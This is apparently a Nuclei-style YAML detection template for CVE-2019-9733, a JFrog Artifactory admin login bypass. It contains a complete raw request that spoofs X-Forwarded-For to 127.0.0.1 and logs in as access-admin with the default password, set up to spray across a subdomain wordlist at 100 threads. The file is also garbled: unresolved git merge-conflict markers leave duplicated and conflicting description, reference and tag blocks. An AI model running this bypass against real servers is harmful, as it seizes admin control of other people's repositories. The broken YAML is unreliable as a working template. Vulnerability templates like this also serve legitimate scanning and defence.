id: CVE-2019-9733
info:
  name: JFrog Artifactory 6.7.3 - Admin Login Bypass
  author: akshansh
  severity: critical
<<<<<<< HEAD
  description: An issue was discovered in JFrog Artifactory 6.7.3. By default, the access-admin account is used to reset the password of the admin account in case an administrator gets locked out from the Artifactory console. This is only allowable from a connection directly from localhost, but providing a X-Forwarded-For HTTP header to the request allows an unauthenticated user to login with the default credentials of the access-admin account while bypassing the whitelist of allowed IP addresses. The access-admin account can use Artifactory's API to request authentication tokens for all users including the admin account and, in turn, assume full control of all artifacts and repositories managed by Artifactory.
<<<<<<< HEAD
=======
  description: JFrog Artifactory 6.7.3 is vulnerable to an admin login bypass issue because by default the access-admin account is used to reset the password of the admin account. While this is only allowable from a connection directly from localhost, providing an X-Forwarded-For HTTP header to the request allows an unauthenticated user to login with the default credentials of the access-admin account while bypassing the whitelist of allowed IP addresses. The access-admin account can use Artifactory's API to request authentication tokens for all users including the admin account and, in turn, assume full control of all artifacts and repositories managed by Artifactory.
>>>>>>> 5d36d276 (add new stuff)
  reference:
    - http://packetstormsecurity.com/files/152172/JFrog-Artifactory-Administrator-Authentication-Bypass.html
    - https://www.ciphertechs.com/jfrog-artifactory-advisory/
    - https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6
<<<<<<< HEAD
  tags: cve,cve2019,artifactory,login
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2019-9733
=======
    - https://nvd.nist.gov/vuln/detail/CVE-2019-9733
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-9733
  tags: packetstorm,cve,cve2019,artifactory,login
>>>>>>> 5d36d276 (add new stuff)
=======
  reference: |
    - http://packetstormsecurity.com/files/152172/JFrog-Artifactory-Administrator-Authentication-Bypass.html
    - https://www.ciphertechs.com/jfrog-artifactory-advisory/
    - https://www.jfrog.com/confluence/display/RTF/Release+Notes#ReleaseNotes-Artifactory6.8.6
  tags: cve,cve2019,artifactory
>>>>>>> 18ddf72b (add new stuff)

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        POST /artifactory/ui/auth/login?_spring_security_remember_me=false HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml        
        Content-Length: 60
        Accept: application/json, text/plain, */*
        X-Requested-With: artUI
        serial: 58
        X-Forwarded-For: 127.0.0.1
        Request-Agent: artifactoryUI
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
        Content-Type: application/json
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/artifactory/webapp/
        Accept-Language: en-US,en;q=0.9
        Connection: close

        {"user":"access-admin","password":"password","type":"login"}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"username": "access-admin"'
        part: body

      - type: status
        status:
<<<<<<< HEAD
          - 200
<<<<<<< HEAD
=======

# Enhanced by mp on 2022/05/04
>>>>>>> 5d36d276 (add new stuff)
=======
          - 200
>>>>>>> 18ddf72b (add new stuff)
